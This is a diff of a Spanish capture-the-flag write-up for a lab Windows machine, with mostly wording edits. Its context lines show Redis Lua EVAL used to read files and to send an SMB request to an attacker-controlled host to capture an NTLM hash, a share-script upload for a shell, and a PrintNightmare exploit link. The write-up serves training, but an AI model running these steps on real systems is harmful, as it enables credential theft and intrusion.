@@ -85,7 +85,7 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
 
   Info--> Redis Pentesting[+] https://exploit-notes.hdks.org/exploit/database/redis-pentesting/
   
-  1)  Conectamos a la BD sin credenciales a ver si podemos obtener algo.
+  1)  Conectamos con el cliente Redis sin credenciales a ver si podemos obtener algo.
 
           ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
           └─# redis-cli -h 10.10.12.222
@@ -103,19 +103,19 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
           104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"  ---> INTERESANTE
           105) "maxmemory-policy"
       
-        De la linea 104 deducimos que --> enterprise-security <-- es un usuario local del sistema, por lo que ya tenemos un usuario del sistema.
+        La linea 104 es interesante, deducimos que --> enterprise-security <-- es un usuario local del sistema, por lo que ya tenemos un usuario del sistema.
       
           Info: Redis mediante el comando EVAL nos permite ejecutar scripts en Lua los cuales deben ser pasados como cadena(String).
 
-  4)  Sabiendo esto podriamos leer la flag de usuario.(La ip cambia hemos tenido que reiniciar la maquina.)
+  4)  Sabiendo esto podriamos leer la flag de usuario.
 
           10.10.240.193:6379> Eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
           (error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near 
           '3eb176aee96---------0bc93580b291e'
 
-  5)  Capturamos el Hash NTLM del usuario --> enterprise-security.(La ip cambia hemos tenido que reiniciar la maquina.)
+  5)  Capturamos el Hash NTLM del usuario --> enterprise-security.
 
-      Este proceso lo podemos hacer montandonos nuestro servidor SMB con impacket-smbserver o utilizando la herramienta Responder.
+      Este proceso lo podemos hacer montando nuestro servidor SMB con impacket-smbserver o utilizando la herramienta Responder.
 
           Que es Responder?
           La función principal de Responder es realizar ataques de captura de credenciales en redes locales.
@@ -137,7 +137,7 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
             [*] Config file parsed
             [*] Config file parsed
 
-          Ejecutamos desde Redis una solicitud SMB hacia nuestro servidor.
+          Ejecutamos desde el Cliente Redis una solicitud SMB hacia nuestro servidor.
 
             10.10.33.40:6379> eval "dofile('//10.9.92.151/SHARE')" 0
             (error) ERR Error running script (call to f_c41ff8afa3459ca8b3df47f2f43eeff829ebc86a): @user_script:1: cannot open //10.9.92.151/SHARE: Invalid argument 
@@ -226,7 +226,7 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
 
   - Analizamos el script y obtenemos Shell.
 
-        Basicamente el script borra si o si todo el contenido de Documentos del usuario Public y en caso de error continua haciendo caso omiso a dicho error.
+        Basicamente el script borra si o si todo el contenido del directorio \Documentos del usuario Public y en caso de error, continua haciendo caso omiso a dicho error.
 
     Probamos a subir de nuevo dicho script para ver si tenemos permiso de escritura en el recuerso compartido y perfecto podemos subir ficheros al recurso.
       
@@ -252,8 +252,9 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
             whoami
             vulnnet\enterprise-security
             PS C:\Users\enterprise-security\Downloads>
+    
 
-
+    
             smb: \> put PurgeIrrelevantData_1826.ps1 
             putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.3 kb/s) (average 0.3 kb/
 
@@ -264,7 +265,7 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
     PS C:\Users\enterprise-security\Desktop> type user.txt
     THM{3eb176aee964-----------00bc93580b291e}
 
--Obtenemos informacion del usuario y sistema para ir viendo como podemos elevar privilegios en la maquina.
+-Obtenemos informacion del usuario y sistema para ver como podemos elevar privilegios en la maquina.
 
   - Sobre que sistema estamos trabajando
 
@@ -294,10 +295,12 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
 
 -Con la informacion obtenida encontramos que la maquina es vulnerable a PrintNightmare (CVE-2021-1675 / CVE-2021-34527).
 
-    Exploit: [+] https://github.com/cube0x0/CVE-2021-1675
-    Info sobre PrintNightmare: [+]https://www.hackplayers.com/2021/07/printnightmare-la-enesima-pesadilla-en-windows.html
+  Exploit: [+] https://github.com/cube0x0/CVE-2021-1675
+  
+  Info sobre PrintNightmare: [+]https://www.hackplayers.com/2021/07/printnightmare-la-enesima-pesadilla-en-windows.html
 
-  Proceso completo
+  Proceso completo:
+  
   ![image](https://github.com/Esevka/CTF/assets/139042999/f9a212f8-440c-4827-a8c4-dfa4548044a4)
 
 
